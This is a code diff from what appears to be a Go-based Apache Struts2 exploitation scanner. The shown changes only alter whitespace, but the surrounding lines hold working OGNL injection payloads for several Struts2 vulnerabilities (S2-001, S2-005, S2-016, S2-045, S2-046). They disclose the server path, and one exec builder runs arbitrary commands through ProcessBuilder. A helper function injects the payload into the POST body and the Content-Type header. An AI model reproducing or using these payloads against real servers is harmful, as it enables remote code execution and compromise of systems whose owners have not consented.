@@ -16,13 +16,13 @@ var (
     Checkflag       = CreateHash("ST2SG")
     Timeout         = time.Second * 3
     GlobalUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-
+    
     POC_s001_webpath = "%25%7b%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()%2c%23response%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2c%23response.println(%27s001webpathstart%27%2b%23req.getRealPath(%27%2f%27)%2b%27s001webpathend%27)%2c%23response.flush()%2c%23response.close()%7d"
     POC_s005_webpath = "?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
     POC_s016_webpath = "?redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
     POC_s045_webpath = "%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcldedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath(\"/\"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
     POC_s046_webpath = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('web')).(#res.getWriter().print('path:')).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath('/'))).(#res.getWriter().flush()).(#res.getWriter().close())}\x00b"
-
+    
     POC_s001_check = "%25%7B3154%2B3154%7D"
     POC_s005_check = POC_s005_exec("echo%20" + Checkflag)
     POC_s007_check = "%27%2B%28%23%7B3154%2B3154%7D%29%2B%27"
@@ -62,7 +62,7 @@ func POC_s009_exec(param string, command string) string {
 }
 func POC_s012_exec(command string) string {
     command = parseCommand(command)
-
+    
     return "%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B" + command + "%7D)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b20000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(%22s012execstart%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d"
 }
 func POC_s013_exec(command string) string {
@@ -137,9 +137,9 @@ func GetBetweenStr(str, start, end string) string {
 }
 func PostFunc4Struts2(pUrl string, postData string, contentType string, st2Payload string) string {
     postData = strings.Replace(postData, "fuckit", st2Payload, 1)
-
+    
     var headers = make(map[string]string)
-
+    
     if contentType != "" {
         headers["Content-Type"] = st2Payload
     }
@@ -147,7 +147,7 @@ func PostFunc4Struts2(pUrl string, postData string, contentType string, st2Paylo
     if err != nil {
         return ""
     }
-
+    
     return resp.Body
 }
 
